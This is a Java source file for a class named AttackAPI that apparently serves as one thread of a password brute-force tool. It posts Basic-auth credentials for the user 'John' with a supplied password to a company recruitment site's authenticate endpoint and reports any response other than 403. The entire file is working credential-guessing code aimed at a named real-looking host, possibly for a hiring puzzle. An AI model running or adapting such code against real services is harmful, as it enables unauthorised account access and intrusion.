import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.Base64;

public class AttackAPI implements Runnable{

    private String username;    
    private String password;

    public AttackAPI(String password){
        
        username = "John";
        this.password = password;

    }
    
    public void run(){

        String authenticator = username +":"+ password;
        String encodedAuthenticator = Base64.getEncoder().encodeToString(authenticator.getBytes());

        HttpClient myClient = HttpClient.newHttpClient();

        HttpRequest myRequest = HttpRequest.newBuilder()
            .uri(URI.create("http://recruitment.warpdevelopment.co.za/api/v2/authenticate"))
            .header("Authorization", "Basic " + encodedAuthenticator)
            .header("Content-Type", "application/json")
            .POST(HttpRequest.BodyPublishers.ofString("{}"))
            .build();

        HttpResponse<String> myResponse;
        try{
            myResponse = myClient.send(myRequest, HttpResponse.BodyHandlers.ofString());
        }

        catch (Exception e){
            myResponse = null;
            System.out.println(e);
            System.exit(0);
        }

        if (myResponse.statusCode() != 403){
             System.out.println("Status code: " + myResponse.statusCode());
        }

    }

}
